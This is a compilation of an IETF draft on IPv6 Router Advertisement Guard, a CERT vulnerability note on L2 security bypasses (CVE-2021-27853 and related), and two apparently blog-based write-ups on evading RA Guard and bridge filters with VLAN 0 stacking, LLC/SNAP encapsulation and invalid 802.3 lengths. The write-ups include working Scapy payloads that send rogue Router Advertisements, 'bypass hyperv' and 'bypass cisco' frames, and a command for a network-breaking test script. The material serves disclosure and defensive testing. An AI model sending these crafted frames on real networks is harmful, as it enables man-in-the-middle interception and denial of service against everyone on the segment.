                    IPv6 Router Advertisement Guard
                   <draft-ietf-v6ops-ra-guard-08.txt>

Abstract

   Routed protocols are often susceptible to spoof attacks.  The
   canonical solution for IPv6 is Secure Neighbor Discovery (SEND), a
   solution that is non-trivial to deploy.  This document proposes a
   light-weight alternative and complement to SEND based on filtering in
   the layer-2 network fabric, using a variety of filtering criteria,
   including, for example, SEND status.

Internet-Draft                IPv6 RA-Guard               September 2010

1.  Introduction

   When operating IPv6 in a shared L2 network segment without complete
   SEND support by all devices connected or without the availability of
   the infrastructure necessary to support Secure Neighbor Discovery
   (SEND) [RFC3971], there is always the risk of facing operational
   problems due to rogue Router Advertisements generated maliciously or
   unintentionally by unauthorized or improperly configured routers
   connecting to the segment.

   There are several examples of work done on this topic which resulted
   in several related studies [reference1] [reference2]
   [reference3].This document describes a solution framework for the
   rogue-RA problem where network segments are designed around a single
   or a set of L2-switching devices capable of identifying invalid RAs
   and blocking them.  The solutions developed within this framework can
   span the spectrum from basic (where the port of the L2 device is
   statically instructed to forward or not to forward RAs received from
   the connected device) to advanced (where a criteria is used by the L2
   device to dynamically validate or invalidate a received RA, this
   criteria can even be based on SEND mechanisms).

2.  Model and Applicability

   RA-Guard applies to an environment where all messages between IPv6
   end-devices traverse the controlled L2 networking devices.  It does
   not apply to a shared media, when devices can communicate directly
   without going through an RA-Guard capable L2 networking device.

   Figure 1 illustrates a deployment scenario for RA-Guard.

   Figure 1

   RA-Guard does not intend to provide a substitute for SEND based
   solutions.  It actually intends to provide complementary solutions in
   those environments where SEND might not be suitable or fully
   supported by all devices involved.  It may take time until SEND is
   ubiquitous in IPv6 networks and some of its large scale deployment
   aspects are sorted out such as provisioning hosts with trust anchors.
   It is also reasonable to expect that some devices might not consider
   implementing SEND at all such as IPv6 enabled sensors.  An RA-Guard
   implementation which SEND-validates RAs on behalf of hosts would
   potentially simplify some of these challenges.

   RA-Guard can be seen as a superset of SEND with regard to router
   authorization.  Its purpose is to filter Router Advertisements based
   on a set of criteria, from a simplistic "RA disallowed on a given
   interface" to "RA allowed from pre-defined sources" and up to full
   fledge SEND "RA allowed from authorized sources only".

   In addition to this granularity on the criteria for filtering out
   Router Advertisements, RA-Guard introduces the concept of router
   authorization proxy.  Instead of each node on the link analyzing RAs
   and making an individual decision, a legitimate node-in-the-middle
   performs the analysis on behalf of all other nodes on the link.  The
   analysis itself is not different from what each node would do: if
   SEND is enabled, the RA is checked against X.509 certificates
   [RFC4861].  If any other criteria is in use, such as known L3
   (addresses) or L2 (link-layer address, port number) legitimate
   sources of RAs, the node-in-the middle can use this criteria and
   filter out any RA that does not comply.  If this node-in-the-middle
   is a L2 device, it will not change the content of the validated RA,

Levy-Abegnoli, et al.     Expires March 6, 2011                 [Page 5]
Internet-Draft                IPv6 RA-Guard               September 2010

   and avoid any of the ND-proxy pitfalls.

   RA-Guard intends to provide simple solutions to the rogue-RA problem
   in contexts where simplicity is required while leveraging SEND in an
   context environment consisting of with a mix of SEND capable devices
   (L2 switches and routers) and devices that do not consistently use
   SEND.  Furthermore, RA-Guard is useful to simplify SEND deployments,
   as only the L2 switch and the routers are required to carry
   certificates (their own and the trust anchor certificates).

3.  Stateless RA-Guard

   Stateless RA-Guard examines incoming RAs and decide whether to
   forward or block them based solely on information found in the
   message or in the L2-device configuration.  Typical information
   available in the frames received, useful for RA validation is:

   o  Link-layer address of the sender
   o  Port on which the frame was received
   o  IP source address
   o  Prefix list

   The following configuration information created on the L2-device can
   be made available to RA-Guard, to validate against the information
   found in the received RA frame:

   o  Allowed/Disallowed link-layer address of RA-sender
   o  Allowed/Disallowed ports for receiving RAs
   o  Allowed/Disallowed IP source addresses of RA-sender
   o  Allowed Prefix list and Prefix ranges
   o  Router Priority

   Once the L2 device has validated the content of the RA frame against
   the configuration, it forwards the RA to destination, whether unicast
   or multicast.  Otherwise, the RA is dropped.

   An example of a very simple stateless RA-Guard implementation could
   be a small L2-switch for which there is one interface "statically-
   configured" as the interface connecting to a router, while all other
   interfaces are for non-router devices.  With his small static setup
   the only interface forwarding RAs will be the pre-assigned router
   interface, while the non-router interfaces block all RAs.

4.  Stateful RA-Guard

Internet-Draft                IPv6 RA-Guard               September 2010

4.1.  State Machine

   Stateful RA-Guard learns dynamically about legitimate RA senders, and
   store this information for allowing subsequent RAs.  A simple
   stateful scheme would be for the L2-device to listen to RAs during a
   certain manual determined period of time, where the start of the
   listening-period and the duration of the listening-period for a
   single instance is controled by the manual intervention.  As result
   the L2-device can then allow subsequent RAs only on those ports on
   which valid RAs were received during this period.  Often the LEARNING
   state will only be activated by manual configuration when a new IPv6
   router is provisioned on the L2-network.

   A more sophisticated stateful scheme is based on SEND, and is
   described in Section 4.2.

   The state machine for stateful RA-Guard can be global, per-interface,
   or per-peer, depending on the scheme used for authorizing RAs.

   When RA-Guard is SEND-based, the state machine is per-peer and
   defined in [RFC3971].

   When RA-Guard is using a discovery method, the state-machine of the
   RA-Guard capability consists of four different states:

   o  State 1: OFF
         A device or interface in RA-Guard "OFF" state, operates as if
         the RA-Guard capability is not available.
   o  State 2: LEARNING
         A device or interface in the RA-Guard "Learning" state is
         actively acquiring information about the IPv6 routing devices
         connected.  The learning process takes place over a pre-defined
         unique period in time, set by manual configuration or it can be
         event triggered.  The information gathered is compared against
         pre-defined criteria; criteria similar as the stateless RA-
         Guard rules to qualify the validity of the RAs.
         In this state, the RA-Guard enabled device or interface is
         either blocking "all" RAs until their validity is verified or,
         alternatively it can temporarily forward "all" the RAs until
         their validity is verified.
         Once the L2-device has identified through "Learning" the valid
         IPv6 routers and hence also identified the valid RAs, it
         transtions each interface from "LEARNING" into either BLOCKING
         state if there was no valid IPv6 router discovered at the
         interface, or transitions the interface into FORWARDING state
         if there was a valid IPv6 router discovered.

Internet-Draft                IPv6 RA-Guard               September 2010

   o  State 3: BLOCKING
         A device or interface running RA-Guard and in Blocking state
         will block ingress RA-messages.
         An interface can transition from BLOCKING state into FORWARDING
         state directly if explicitly instructed by the L2-device
         operator.
         An interface can transition from BLOCKING state into LEARNING
         state if either explicitly told by the L2-device operator or by
         a triggered event.
   o  State 4: FORWARDING
         A device or interface running RA-Guard and in Forwarding state
         will accept valid ingress RAs and forward them to their
         destination.
         An interface can transition from FORWARDING state into BLOCKING
         state directly if explicitly instructed by the L2-device
         operator.
         An interface can transition from FORWARDING state into LEARNING
         state if either explicitly told by the L2-device operator or by
         a triggered event.

   The transition between these states can be triggered by manual
   configuration or by meeting a pre-defined criteria.

4.2.  SEND-based RA-Guard

   In this scenario, the L2 device is blocking or forwarding RAs based
   on SEND considerations.  Upon capturing an RA on the interface, the
   L2-device will first verify the Cryptographically Generated Addresses
   (CGA) [RFC3971] address and the RSA (Rivest, Shamir and Adleman
   algorithm for public-key cryptography) signature, as specified in
   section 5 of [RFC3971].  RA should be dropped in case of failure of
   this verification.  It will then apply host behavior as described in
   section 6.4.6 of [RFC3971].  In particular, the L2 device will
   attempt to retrieve a valid certificate from its cache for the public
   key referred to in the RA.  If such certificate is found, the L2
   device will forward the RA to destination.  If not, the L2 device
   will generate a Certification Path Solicitation (CPS) [RFC3971],
   sourced with UNSPECIFIED address, to query the router certificate(s).
   It will then capture the Certification Path Advertisements (CPA)
   [RFC3971], and attempt to validate the certificate chain.  Failure to
   validate the chain will result in dropping the RA.  Upon validation
   success, the L2 device will forward the RA to destination and and
   store the router certificate in its cache.

   In order to operate in this scenario, the L2-device should be
   provisioned with a trust anchor certificate, as specified in section
   6 of [RFC3971].  It may also establish a layer-3 connectivity with a
   Certificate Revocation List (CRL) Certification Path Advertisement

   server and/or with and NTP server.  Bootstrapping issue in this case
   can be resolved by using the configuration method to specify a
   trusted port to a first router, and SEND-based RA-Guard method on all
   other ports.  The first router can then be used for Network Time
   Protocol (NTP) [RFC5905] and CRL connectivity.

5.  RA-Guard Use Considerations

   The RA-Guard mechanism is effective only when all messages between
   IPv6 devices in the target environment traverse controlled L2
   networking devices.  In the case of environments such as Ethernet
   hubs, devices can communicate directly without going through an RA-
   Guard capable L2 networking device, the RA-Guard feature cannot
   protect against rogue-RAs.

   RA-Guard mechanisms do not offer protection in environments where
   IPv6 traffic is tunneled.

6.  IANA Considerations

   There are no extra IANA consideration for this document.

7.  Security Considerations

   Once RA-Guard has setup the proper criteria, for example, it
   identified that a port is allowed to receive RAs, or it identified
   legitimate sources of RA, or certificate base [RFC4861], then there
   is no possible instances of accidently filtered legitimate Router
   advertisements assuming the RA-Guard filter enforcement follows
   strictly the RA-Guard set criteria.

   in Section 4.1 a simple mechanism to learn dynamical the valid IPv6
   routers connected to a L2-device is explained.  It is important that
   this LEARN state is only entered intentionally by manual
   configuration.  The list of learned IPv6 routers should be verified
   by the network manager to make sure that it corresponds with the
   expected valid RA list.  This procedure will make sure that either
   accidently or intentionally rogue RAs are blocked by RA-guard.

# Bridge firewalling “bypass” using VLAN 0

See follow up article: [Layer 2 network security bypass using VLAN 0, LLC/SNAP headers and invalid length](/VLAN0_LLC_SNAP/)

L2 networks are insecure by default, vulnerable to ARP, DHCP, Router Advertisement spoofing to name a few.
Over the years security mechanisms have been implemented to detect and or stop those attacks.
As usual when you try to filter anything, you MUST use an allow list approach, else you risk letting some unwanted traffic go through.

I was not able to find anything about VLAN 0 attacks, so this might be a novel attack.

The packet syntax in this article is the one used by [Scapy](https://scapy.readthedocs.io/)

## VLAN 0

Many people know that VLAN 1 is special, and that VLAN 0 and 4095 are reserved.
Now to be more precise, VLAN 0, i.e. having `VID` set to `0x000`, “indicates that the frame does not carry a VLAN ID;
in this case, the `802.1Q` tag specifies only a priority (in `PCP` and `DEI` fields) and is referred to as a priority tag” (Wikipedia).

When Linux receives a `802.1Q` packet, it looks up if a VLAN interface with the correct `VID` exists to handle this packet, else it’ll be dropped.
For example, a packet with `VID` == 42 would go to `eth0.42`.

Now if `VID` == `0x000`, Linux ignores/removes the VLAN header and handles it on the untagged interface, ie `eth0`.
To be more precise, on raw sockets (tcpdump) you will see the header (always use `tcpdump -e`).
This means that any software that reads packets from raw sockets must take care of ignoring `VID` == `0x000` packets,
and I discovered the hard way trying to make ucarp work, that on some Cisco UCS servers always add a priority tag.

To sum up, using Scapy syntax, both

```
Ether()/IP(dst="192.168.2.1")/ICMP()
Ether()/Dot1Q(vlan=0)/IP(dst="192.168.2.1")/ICMP()

```

will trigger the same response from 192.168.2.1, but for the first packet, `ethertype` is `0x0800` (IPv4), and for the second it’s `0x8100` (802.1Q).
Even if semantically they are the same, they are definitely different at L2, and that can be a problem.

Now the good news is that Linux also supports `802.1AD`, and it will remove any number of VLAN 0 headers, so

```
Ether()/Dot1Q(vlan=0)/Dot1AD(vlan=0)/Dot1Q(vlan=0)/IP(dst="192.168.2.1")/ICMP()

```

Will also work

## Linux firewalling and VLAN 0

Linux can do bridge firewalling using:

1. `XDP`
2. `tc`
3. `ebtables`
4. `nftables` `netdev` tables
5. `ip(6)tables` with `br_netfilter` module and `net.bridge.bridge-nf-call-ip(6)tables=1`
6. `nftables` `bridge` tables

In all those cases, the rules apply to the “full” packet, i.e. with the VLAN 0 header, meaning that

```
ip6tables -A FORWARD -p ipv6-icmp -m icmp6 --icmpv6-type 134 -j DROP

```

will block IPv6 Router Advertisements without VLAN 0 only, as `ip6tables` will handle “switched” packets with `ethertype` == `0x86dd` only

Enabling `bridge-nf-filter-vlan-tagged` allows to remove 1 level of VLAN headers, but we can just put 2 levels and be done.

## POC

Launch Scapy

```
ra = Ether()/Dot1Q(vlan=0)/Dot1Q(vlan=0)
ra /= IPv6(dst='ff02::1')
ra /= ICMPv6ND_RA(chlim=64, prf='High', routerlifetime=1800)
ra /= ICMPv6NDOptSrcLLAddr(lladdr=get_if_hwaddr('eth0'))
ra /= ICMPv6NDOptPrefixInfo(prefix="2001:db8:1::", prefixlen=64, validlifetime=1810, preferredlifetime=1800)
sendp(ra)

```

(If it works, it’ll misconfigure all devices in the same L2 for 30min, you have been warned)

## Tested Software

* Openstack: Vulnerable when using Neutron ML2 with Linuxbridge driver (iptables bridge firewall + ebtables rules), [public bug report](https://bugs.launchpad.net/neutron/%2Bbug/1884341)
* LXD: Vulnerable when using bridged interfaces (security.\*\_filtering bypass), [fixed the next day](https://github.com/lxc/lxd/pull/7575)
* Microsoft Hyper-V: [CVE-2020-17040](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-17040)
* VMware ESXi: no DHCP snooping / RA guard by default, so nothing to bypass ;)
* Libvirt: nwfilter predefined rules take an allow list approach, so this is safe.

I don’t have any managed switch with RA guard to play with.

This IEEE Standards product is part of the 802 family on LAN/MAN. This standard is part of a family of standards for local area networks (LANs) and metropolitan area networks (MANs) that deals with the physical and data link layers as defined by the ISO Open Systems Interconnection Basic Reference Model. The functions, features, protocol, and services of the Logical Link Control (LLC) sublayer, which constitutes the top sublayer in the data link layer of the ISO/IEC 8802 LAN protocol, are described. The services required of, or by, the LLC sublayer at the logical interfaces with the network layer, the medium access control (MAC) sublayer, and the LLC sublayer management function are specified. The protocol data unit (PDU) structure for data communication systems is defined using bit-oriented procedures, as are three types of operation for data communication between service access points. In the first type of operation, PDUs are exchanged between LLCs without the need for the establishment of a data link connection. In the second type of operation, a data link connection is established between two LLCs prior to any exchange of information-bearing PDUs. In the third type of operation, PDUs are exchanged between LLCs without the need for the establishment of a data link connection, but stations are permitted to both send data and request the return of data simultaneously.

## L2 network security controls can be bypassed using VLAN 0 stacking and/or 802.3 headers

#### Vulnerability Note VU#855201

Original Release Date: 2022-09-27 | Last Revised: 2023-06-14

---

### Overview

Layer-2 (L2) network security controls provided by various devices, such as switches, routers, and operating systems, can be bypassed by stacking Ethernet protocol headers. An attacker can send crafted packets through vulnerable devices to cause Denial-of-service (DoS) or to perform a man-in-the-middle (MitM) attack against a target network.

### Description

This vulnerability exists within Ethernet encapsulation protocols that allow for stacking of Virtual Local Area Network (VLAN) headers. Network standards such as [IEEE 802.1Q-1998](https://standards.ieee.org/standard/802_1Q-1998.html) and [IEEE 802.3](https://standards.ieee.org/standard/802_3-2018.html) define a system of tagging Ethernet frames that help isolate networks to provide virtual networking capability. IEEE standard [802.1ad](https://standards.ieee.org/standard/802_1ad-2005.html), also known as QinQ, allows for the stacking of these VLAN tags, extending the VLAN capability into multiple network segments. This widely adopted Ethernet feature is also referred to as "provider bridging" and "stacked VLANs". In order to properly isolate and protect these virtual networks, many network devices and operating systems provide an L2 network filtering capability. It is important to note that in modern computing environments , such as Cloud based virtualization and virtual networking, the L2 network capability is extended beyond the local area networks. This can lead to exposure of this vulnerabilities in unintended ways to the larger Internet.

The identified vulnerabilities allow an attacker to bypass the security controls by stacking encapsulating headers. This is done by stacking a combination of one or more VLAN 0 (priority tag) headers and [802.2](https://standards.ieee.org/standard/802_2-1985.html) LLC/SNAP headers. An attacker can send these crafted network packets and exploit vulnerable devices by bypassing their inspection and filtering capabilities. Some examples of bypassed L2 inspections include, but are not limited to, [Dynamic ARP inspection](https://blogs.nwkings.com/what-is-dai-dynamic-arp-inspection/), [IPv6 Neighbor Discovery](https://datatracker.ietf.org/doc/rfc4861/) (ND) protection, and [IPv6 RA Guard](https://datatracker.ietf.org/doc/html/rfc6105).

**CVE-2021-27853**
Layer 2 network filtering capabilities such as IPv6 RA guard or ARP inspection can be bypassed using combinations of VLAN 0 headers and LLC/SNAP headers.

**CVE-2021-27854**
Layer 2 network filtering capabilities such as IPv6 RA guard can be bypassed using combinations of VLAN 0 headers, LLC/SNAP headers in Ethernet to Wifi frame translation and the reverse Wifi to Ethernet.

**CVE-2021-27861**
Layer 2 network filtering capabilities such as IPv6 RA guard can be bypassed using LLC/SNAP headers with invalid length (and optionally VLAN0 headers).

**CVE-2021-27862**
Layer 2 network filtering capabilities such as IPv6 RA guard can be bypassed using LLC/SNAP headers with invalid length and Ethernet to Wifi frame conversion (and optionally VLAN0 headers).

### Impact

An attacker can bypass security controls and deceive a locally connected target host to route traffic to arbitrary destinations. Victim devices experience either a DoS (blackholing traffic) or MitM (observing the unencrypted traffic and maybe breaking encryption).

### Solution

#### Apply Updates

Install vendor-provided patches and updates to ensure malicious content is blocked or rejected by the security controls (such as RA Guard), thereby blocking router advertisements or other network configuration related advertisements that originate on host ports.

#### Inspect and Block Router Advertisements

Utilize the interface security controls on your router or managed switch to perform DHCP snooping, IPv6 RA guard, IP source guard, and ARP/ND inspection. It is also recommended to only allow needed protocol on access ports (ARP/ICMP/IPv4/IPv6), some applications may have additional needs so be prepared to modify the allow list as needed.

# Layer 2 network security bypass using VLAN 0, LLC/SNAP headers and invalid length

## TLDR

You should always drop unknown/unclassified traffic.
Using VLAN 0, LLC/SNAP headers and invalid length gives you multiple ways to
encapsulate the same L3 payload on Ethernet/Wifi, allowing to bypass some
L2 network security control implementations like IPv6 Router Advertisement Guard.

## Intro

Following my previous article on [VLAN 0](/VLAN0/), I had two itches to scratch.

First, after reading [Proper isolation of a Linux bridge article from Vincent Bernat](https://vincent.bernat.ch/en/blog/2017-linux-bridge-isolation) some time ago and seeing:

```
$ cat /proc/net/ptype
Type Device      Function
0800          ip_rcv
0011          llc_rcv [llc]
0004          llc_rcv [llc]
0806          arp_rcv
86dd          ipv6_rcv

```

I wanted to understand what were those `llc` packets and what I could do with them,
but it took me a long time and some luck to craft some useful packets with LLC/SNAP headers.

Second, I wanted to test bypassing layer 2 security on managed switches. As I was staying home for the end of 2020 (COVID …),
I decided to buy myself one of the cheapest Cisco switches with IPv6 first-hop security (CBS350-8T-E-2G), and was able to bypass its IPv6 RA Guard implementation using VLAN 0 and/or LLC/SNAP headers.

After reporting my findings to Cisco PSIRT, I reported these same bypasses to Juniper SIRT, but I didn’t have time to continue reporting to all network vendors and coordinate between them. Thankfully I discovered that you can [report vulnerabilities that affect multiple vendors to CERT/CC](https://www.kb.cert.org/vuls/report/) and they will take care of reporting to and coordinating between all vendors.

The packet syntax in this article is the one used by [Scapy](https://scapy.readthedocs.io/).
If you want to try the examples you might need to replace `Dot3()` with `Dot3(src=get_if_hwaddr(ifname))`.

* [Novell - Migrating Ethernet Frame Types from 802.3 Raw to IEEE 802.2](https://support.novell.com/techcenter/articles/ana19930905.html)

To make it short, an Ethernet frame always starts with a preamble, start frame delimiter, MAC destination, MAC source, then VLAN headers (if used), and then the content depends on which of the 4 frame types you are using:

* Ethernet II: also known as DIX Ethernet, this is the most common, and starts with EtherType (2 bytes) that identifies the upper layer (0x0800 == IPv4, 0x0806 == ARP, 0x86DD == IPv6). See [RFC 894](%28https%3A//www.rfc-editor.org/rfc/rfc894%29) and [RFC 2464](https://www.rfc-editor.org/rfc/rfc2464).
* Novell raw IEEE 802.3: This was used to transport IPX until the mid-nineties, starts with 2 bytes length then 0xFFFF.
* IEEE 802.2 LLC: in IEEE 802.3 standard a frame starts with 2 bytes length followed by 802.2 LLC (logical link control) header. 802.2 defines 3 operational modes, but we are only interested in unacknowledged connection-less mode. IPv4 and ARP can be encapsulated in 802.2 LLC headers as defined in [RFC 948](https://www.rfc-editor.org/rfc/rfc948), but as said in [RFC 1010](https://www.rfc-editor.org/rfc/rfc1010) from 1987 “The use of the IP LSAP is to be phased out as quickly as possible”.
* IEEE 802.2 LLC/SNAP: [RFC 1042](https://datatracker.ietf.org/doc/html/rfc1042) defines how to encapsulate IP using LLC/SNAP, and this is the default for all 802 networks except Ethernet, DSAP == SSAP == 170 == 0xAA (SNAP Headers), Control == 3 (unacknowledged connectionless mode / U-format PDUs), SNAP OUI 24 bits == 0x000000 or 0x0000F8, SNAP protocol id 16 bits == EtherType.

![The 4 Ethernet frame formats](/VLAN0_LLC_SNAP/Ethernet-frame-formats.svg)

LLC/SNAP with OUI 0x000000 can be called “SNAP RFC1042”, and LLC/SNAP with OUI 0x0000f8 called “SNAP 802.1H”.
I found “SNAP 802.1H” by chance while looking at Linux mac80211 code.

Using Scapy notation, here are 3 ways to encapsulate an ICMP Echo request to 192.168.1.2:

```
Ether()/IP(dst='192.168.1.2')/ICMP()
Dot3()/LLC(ctrl=3)/SNAP()/IP(dst='192.168.1.2')/ICMP()
Dot3()/LLC(ctrl=3)/SNAP(OUI=0x0000f8)/IP(dst='192.168.1.2')/ICMP()

```

Scapy is computing a lot of values for us, here the same packets expanded a bit:

```
Ether(type=0x0800)/IP(dst='192.168.1.2')/ICMP()
Dot3()/LLC(dsap=0xaa,ssap=0xaa,ctrl=3)/SNAP(OUI=0x000000,code=0x0800)/IP(dst='192.168.1.2')/ICMP()
Dot3()/LLC(dsap=0xaa,ssap=0xaa,ctrl=3)/SNAP(OUI=0x0000f8,code=0x0800)/IP(dst='192.168.1.2')/ICMP()

```

[RFC1122 - Section 2.3.3](https://www.rfc-editor.org/rfc/rfc1122#section-2.3.3) states that:
“Every Internet host connected to a 10Mbps Ethernet cable:

* MUST be able to send and receive packets using RFC-894 encapsulation;
* SHOULD be able to receive RFC-1042 packets, intermixed with RFC-894 packets; and
* MAY be able to send packets using RFC-1042 encapsulation.
  An Internet host that implements sending both the RFC-894 and the RFC-1042 encapsulation MUST provide a configuration switch to select which is sent, and this switch MUST default to RFC-894.”

After reading section 2.3.3, it’s less surprising to know that Microsoft Windows has a boolean [ArpUseEtherSNAP](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/setarpuseethersnap-method-in-class-win32-networkadapterconfiguration) that ‘enables TCP/IP to transmit Ethernet packets using 802.3 SNAP encoding’ and ‘by default, the stack transmits packets in Digital, Intel, Xerox (DIX) Ethernet format (but) it always receives both formats’, ie Windows accepts Ethernet II, “SNAP RFC1042” and “SNAP 802.1H” format.

LLC/SNAP Frames on 802.3 have a maximum size of 1500, so in 2001 [Extended Ethernet Frame Size Support RFC](https://datatracker.ietf.org/doc/html/draft-ietf-isis-ext-eth)
was sent out. In short, instead of having the length, use `0x8870` Ethertype. This RFC was never accepted, but Wireshark decodes such frame and Scapy forge them:

```
Ether()/LLC(ctrl=3)/SNAP()/IP(dst='192.168.1.2')/ICMP()

```

(notice the `Ether()` instead of `Dot3()`)

To finish in 2003 the IEEE defined “OUI Extended Ethertype”, Ethertype `0x88B7` followed by 3 octets OUI and 2 octets protocol. We could say it’s LLC/SNAP without the LLC header.

```
Ether(type=0x88B7)/SNAP(OUI=0x000000)/IP(dst='192.168.1.2')/ICMP()
Ether(type=0x88B7)/SNAP(OUI=0x0000f8)/IP(dst='192.168.1.2')/ICMP()

```

And of course OUI Extended Ethertype can be encapsulated inside LLC/SNAP

```
Dot3()/LLC(ctrl=3)/SNAP(OUI=0x000000,code=0x88b7)/SNAP(OUI=0x000000)/IP(dst='192.168.1.2')/ICMP()

```
## Invalid 802.3 length

In an Ethernet frame, the 2 bytes after the source MAC can either be a length or an EtherType.
Values greater than or equal to 1536 (0x0600) indicates that the field is an EtherType and the frame an Ethernet II frame.
Values less than or equal to 1500 (0x05dc) indicates that the field is the length and the frame is Novell raw, 802.2 LLC or 802.2 LLC/SNAP.
Values between 1500 and 1536, exclusive, are undefined.

The 802.3 length is redundant with the frame length, so a simple implementation can ignore if the value is coherent and just do:

```
if (pkt[12:13] >= 1536):
    handle_ethernet2()
elif (pkt[14:15] == 0xaaaa):
    handle_llc_snap()
elif (pkt[14:15] == 0xffff):
    handle_novell_raw()
else:
    handle_llc()

```

Microsoft Windows accept 802.3 headers with any length between 0 and 1535 (0x05ff) inclusive.
On it’s own this is not an issue, but some devices doing L2 security ignore packets with length between 1501 and 1535 or with length that is not coherent with the frame length (they are not valid 802.3 packets after all), meaning they let rogue packets thru that are then accepted by Windows.

Here 2 simple example:

```
# bypass hyperv
Dot3(src=get_if_hwaddr(ifname),len=0)/LLC(ctrl=3)/SNAP()/ra
# bypass cisco
Dot3(src=get_if_hwaddr(ifname),len=0x05ff)/LLC(ctrl=3)/SNAP()/ra

```
## Frame conversion between 802.3/Ethernet and 802.11

If you open Wireshark, look at some packets on your wired interface and some packets on your wireless, you will likely see that all packets are using Ethernet II headers. You might also have seen in the past TCP packets bigger than the interface MTU. For some (good) reasons, your OS and Wireshark are lying to you.
If you want to see what real 802.11 traffic looks like, Wireshark wiki has some [802.11 sample captures](https://gitlab.com/wireshark/wireshark/-/wikis/SampleCaptures#wifi-wireless-lan-captures-80211).

Linux accepts IP packets with multiple VLAN 0 headers (see previous write-up) but not with LLC/SNAP encapsulation, what if we could combine both ?

When a frame is forwarded from 802.3/Ethernet to 802.11 (Wifi), the layer 2 part of the frame needs to be rewritten.
Linux 802.11 wireless stack (mac80211) accepts frames with both Ethernet II and 802.2 LLC/SNAP encapsulation as input, so both

```
Ether()/IP(dst='192.168.1.2')/ICMP()
Dot3()/LLC(ctrl=3)/SNAP()/IP(dst='192.168.1.2')/ICMP()

```

become something that looks like

```
Dot11()/LLC(ctrl=3)/SNAP()/IP(dst='192.168.1.2')/ICMP()

```

and if we mix VLAN 0 between LLC/SNAP and IP headers

```
Dot3()/LLC(ctrl=3)/SNAP()/Dot1Q(vlan=0)/IP(dst='192.168.1.2')/ICMP()

```

becomes something like

```
Dot11()/LLC(ctrl=3)/SNAP()/Dot1Q(vlan=0)/IP(dst='192.168.1.2')/ICMP()

```

For 802.3, VLAN headers should be between the source MAC and the length, whereas for all other 802 networks, VLAN headers are after the LLC/SNAP header.
By putting VLAN headers after the LLC/SNAP header for 802.3, we can bypass some L2 filtering, and still be accepted by most OS.

![Ethernet II / 802.3 / 802.11 / VLAN 0](/VLAN0_LLC_SNAP/Ethernet-8023-80211.svg)

If we send the following packet using Scapy on a wireless interface

```
Ether()/Dot1Q(vlan=0,type=len(LLC()/SNAP()/IP()/ICMP()))/LLC(ctrl=3)/SNAP()/IP(dst='192.168.1.2')/ICMP()

```

Linux will actually send

```
Dot11()/LLC(ctrl=3)/SNAP()/Dot1Q(vlan=0,type=len(LLC()/SNAP()/IP()/ICMP()))/LLC(ctrl=3)/SNAP()/IP(dst='192.168.1.2')/ICMP()

```

and when converted from 802.11 to Ethernet II we end up with

```
Ether()/Dot1Q(vlan=0,type=len(LLC()/SNAP()/IP()/ICMP()))/LLC(ctrl=3)/SNAP()/IP(dst='192.168.1.2')/ICMP()

```

To finish, Linux will happily ignore the 802.3 length while converting from 802.3 to 802.11, so

```
Dot3(len=0)/LLC(ctrl=3)/SNAP()/IP(dst='192.168.1.2')/ICMP()

```

becomes a valid packet

```
Dot11()/LLC(ctrl=3)/SNAP()/IP(dst='192.168.1.2')/ICMP()

```
## How to test your network

As there are a lot of possible combinations, I’ve written a small script that uses Scapy to send many of them: [l2-security-whack-a-mole.py](/VLAN0_LLC_SNAP/l2-security-whack-a-mole.py).
Perform the attacks via both wired and wireless interfaces.
An example to send Router Advertisements

```
sudo python3 l2-security-whack-a-mole.py -i eth0 --i-want-to-break-my-network ipv6_ra <IPv6 Link Local addr of eth0> ff02::1

```
## Going deeper

While researching for those L2 attacks, I stumbled upon an awesome research from 2013 injecting specially crafted packets at L1 to confuse some switches and NICs:
